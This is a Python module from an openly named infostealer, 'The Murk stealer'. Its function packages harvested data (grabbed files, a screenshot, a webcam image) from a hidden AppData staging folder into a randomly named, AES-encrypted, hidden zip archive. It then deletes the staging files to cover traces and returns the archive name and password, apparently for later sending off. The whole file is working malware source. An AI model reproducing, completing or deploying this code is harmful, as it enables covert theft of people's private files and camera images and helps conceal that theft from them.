#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from shutil import make_archive,rmtree
from os import environ,sep,chdir,remove,rmdir
from random import randint
from pyzipper import AESZipFile,ZIP_STORED,WZ_AES
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes

def makemeZip(name,password,np):
	try:
		dox = "qwertyuiopasdfghjklzxcvbnm1234567890"# symbols for pwd and name
		for i in range (40):
			name += dox[randint(0,len(dox)-1)]# generate name
		name = rf"{environ['USERPROFILE']}\AppData\Local\{name}"
		for i in range (60):
			password += dox[randint(0,len(dox)-1)]# generate pwd
		print(password)
		path = environ['USERPROFILE'] + sep + r'AppData\Local'
		chdir(path)
		make_archive(fr'{path}\cache', 'zip', fr'{path}\windll')# make .zip
		SetFileAttributes(r'cache.zip', FILE_ATTRIBUTE_HIDDEN)# hide it
		#shutil.move(fr'{path}\cache.zip',"cache.zip")
		pwd = bytes(password, "UTF-8")
		print(pwd)
		with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:# make .zip
			SetFileAttributes(f'{name}.zip', FILE_ATTRIBUTE_HIDDEN)
			logs.setpassword(pwd)# set pwd
			logs.write(r'cache.zip')# write
		"""
		clean all
		"""
		remove("cache.zip")
		rmtree(rf'{path}\windll\File-Grubber', ignore_errors=True)
		rmtree(rf'{path}\windll', ignore_errors=True)
		try:
			rmdir(rf'{path}\windll')
		except Exception as e:
			print(e)
		np.append(name)
		np.append(password)
		try:
			remove(rf'{path}\windll\sreenshot.jpg')
			remove(rf'{path}\windll\webcam.png')
		except:
			pass
		return np
	except Exception as e:
		print(e)